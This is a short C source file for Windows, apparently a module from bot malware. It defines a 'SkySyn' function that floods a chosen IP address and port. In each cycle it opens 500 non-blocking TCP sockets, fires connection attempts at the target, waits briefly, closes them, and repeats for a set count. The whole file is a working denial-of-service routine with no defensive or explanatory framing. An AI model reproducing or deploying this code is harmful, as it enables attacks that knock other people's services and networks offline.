#include "includes.h"
#include "extern.h"
#define SKYSYN_SOCKETS 500

void SkySyn(char *target, char *port, char *len)
{
	unsigned short p = (unsigned short)atoi(port);
	int t = atoi(len);
	
	int skydelay = 100;
	SOCKADDR_IN    SockAddr;
	SOCKET         zock[SKYSYN_SOCKETS];
   	IN_ADDR iaddr;
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(p);
	LPHOSTENT lpHostEntry = NULL;
	DWORD mode = 1;
	int c,i;
	iaddr.s_addr = inet_addr(target);
	SockAddr.sin_addr = iaddr; //ip addy
	i = 0;
	while (i < t) {
		for (c=0;c<SKYSYN_SOCKETS;c++)
		{
			zock[c] = socket(AF_INET, SOCK_STREAM, 0);
			if (zock[c] == INVALID_SOCKET)
				continue;
			ioctlsocket(zock[c],FIONBIO,&mode);
		}
		for (c=0;c<SKYSYN_SOCKETS;c++)
			connect(zock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
      		Sleep(skydelay);     
			for (c=0;c<SKYSYN_SOCKETS;c++)
				closesocket(zock[c]); //close sockets
			i++;
	}
}
